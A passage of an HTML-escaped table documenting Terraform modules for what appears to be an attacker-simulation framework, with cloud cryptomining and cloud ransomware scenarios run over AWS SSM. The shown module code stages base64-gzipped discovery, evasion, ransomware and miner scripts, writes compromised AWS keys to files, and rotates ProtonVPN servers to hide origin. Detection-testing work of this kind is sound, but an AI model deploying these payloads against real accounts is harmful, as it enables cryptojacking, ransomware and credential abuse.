templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| attacker-simulation-attacker-exec-docker-composite-cloud-cryptomining      | ./modules/ssm/execute-docker-composite-cloud-cryptomining      | ssm_exec_docker_cloud_cryptomining         | context.aws.ssm.attacker.execute.docker_composite_cloud_cryptomining      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_cloud_cryptomining": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-cloud-cryptomining      | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/cloud&#45;tunnel&quot;<br/>    script = &quot;cloudcrypto&quot;<br/>    script&&#35;95;type = &quot;terraform&quot;<br/>    attack&&#35;95;type = &quot;cloud&&#35;95;cryptomining&quot;<br/>    aws&&#35;95;creds = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for u,k in var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;: &quot;echo &&#35;x27;$&&#35;123;k&#46;rendered&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;aws&#45;$&&#35;123;u&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/protonvpn<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    $&&#35;123;local&#46;aws&&#35;95;creds&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;start&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/start&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;auto&#45;free&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/auto&#45;free&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;auto&#45;paid&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/auto&#45;paid&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&#45;paid&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn&#45;paid<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&#45;baseline&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn&#45;baseline<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;baseline&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/baseline&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;discovery&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/discovery&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;evasion&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/evasion&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;cloudransom&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/cloudransom&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;cloudcrypto&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto/main&#46;tf<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;terraform&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto/terraform&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;hostcrypto&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto/main&#46;tf<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;terraform&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto/terraform&#46;sh<br/>    log &quot;Starting as background job&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;125;&quot; == &quot;0&quot; &&#35;93;; then<br/>        for i in $&&#35;40;echo &quot;US NL&#45;FREE&#35;1 JP&#45;FREE&#35;3 NL&#45;FREE&#35;4 NL&#45;FREE&#35;8 US&#45;FREE&#35;5 NL&#45;FREE&#35;9 NL&#45;FREE&#35;12 NL&#45;FREE&#35;13 NL&#45;FREE&#35;14 NL&#45;FREE&#35;15 NL&#45;FREE&#35;16 US&#45;FREE&#35;13 US&#45;FREE&#35;32 US&#45;FREE&#35;33 US&#45;FREE&#35;34 NL&#45;FREE&#35;39 NL&#45;FREE&#35;52 NL&#45;FREE&#35;57 NL&#45;FREE&#35;87 NL&#45;FREE&#35;133 NL&#45;FREE&#35;136 NL&#45;FREE&#35;148 US&#45;FREE&#35;52 US&#45;FREE&#35;53 US&#45;FREE&#35;54 US&#45;FREE&#35;51 NL&#45;FREE&#35;163 NL&#45;FREE&#35;164 US&#45;FREE&#35;58 US&#45;FREE&#35;57 US&#45;FREE&#35;56 US&#45;FREE&#35;55&quot;&&#35;41;; do cp &#46;env&#45;protonvpn &#46;env&#45;protonvpn&#45;$i; sed &#45;i &quot;s/RANDOM/$i/&quot; &#46;env&#45;protonvpn&#45;$i; done<br/>        /bin/bash auto&#45;free&#46;sh<br/>    else<br/>        for i in $&&#35;40;echo &quot;AU CR IS JP LV NL NZ SG SK US&quot;&&#35;41;; do cp &#46;env&#45;protonvpn&#45;paid &#46;env&#45;protonvpn&#45;paid&#45;$i; sed &#45;i &quot;s/RANDOM/$i/&quot; &#46;env&#45;protonvpn&#45;paid&#45;$i; done<br/>        /bin/bash auto&#45;paid&#46;sh<br/>    fi;<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    protonvpn       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;server&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;tier = tostring&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;41;<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    protonvpn&#45;paid       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;server&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;tier = 2<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    protonvpn&#45;baseline  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = &quot;US&quot;<br/>                                    protonvpn&&#35;95;tier = tostring&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;41;<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    auto&#45;free   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/auto&#45;free&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    compromised&&#35;95;keys&&#35;95;user = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;<br/>                                    script = local&#46;script<br/>                                    script&&#35;95;type = local&#46;script&&#35;95;type<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                    attack&&#35;95;delay = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    auto&#45;paid   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/auto&#45;paid&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    compromised&&#35;95;keys&&#35;95;user = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;<br/>                                    script = local&#46;script<br/>                                    script&&#35;95;type = local&#46;script&&#35;95;type<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                    attack&&#35;95;delay = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    baseline    = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/baseline&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    discovery   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/discovery&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    evasion     = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/evasion&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    cloudransom = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/cloudransom&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    cloudcrypto = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto&#46;tf&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    name = &quot;crypto&#45;gpu&#45;miner&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                    instances = 12<br/>                                    wallet = var&#46;inputs&&#35;91;&quot;ethermine&&#35;95;wallet&quot;&&#35;93;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    hostcrypto  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/hostcrypto&#46;tf&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    name = &quot;host&#45;cpu&#45;miner&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;<br/>                                    instances = 1<br/>                                    minergate&&#35;95;user = var&#46;inputs&&#35;91;&quot;minergate&&#35;95;user&quot;&&#35;93;<br/>                                    nicehash&&#35;95;user = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;user&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    terraform  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/terraform&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    start       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/start&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;auto&#45;free&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;auto&#45;free&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;auto&#45;paid&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;auto&#45;paid&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;baseline&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;baseline&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;discovery&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;discovery&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;evasion&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;evasion&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;cloudransom&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;cloudransom&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;terraform&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;terraform&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;start&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;start&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/><br/><br/>&&#35;125;</pre> |
| attacker-simulation-attacker-exec-docker-composite-cloud-ransomware        | ./modules/ssm/execute-docker-composite-cloud-ransomware        | ssm_exec_docker_cloud_ransomware           | context.aws.ssm.attacker.execute.docker_composite_cloud_ransomware        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_cloud_ransomware": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-cloud-ransomware        | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/cloud&#45;tunnel&quot;<br/>    script = &quot;cloudransom&#46;sh&quot;<br/>    script&&#35;95;type = &quot;aws&#45;cli&quot;<br/>    attack&&#35;95;type = &quot;cloud&&#35;95;ransomware&quot;<br/>    aws&&#35;95;creds = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for u,k in var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;: &quot;echo &&#35;x27;$&&#35;123;k&#46;rendered&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;aws&#45;$&&#35;123;u&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/protonvpn<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    $&&#35;123;local&#46;aws&&#35;95;creds&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;start&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/start&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;auto&#45;free&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/auto&#45;free&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;auto&#45;paid&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/auto&#45;paid&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&#45;paid&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn&#45;paid<br/>    echo 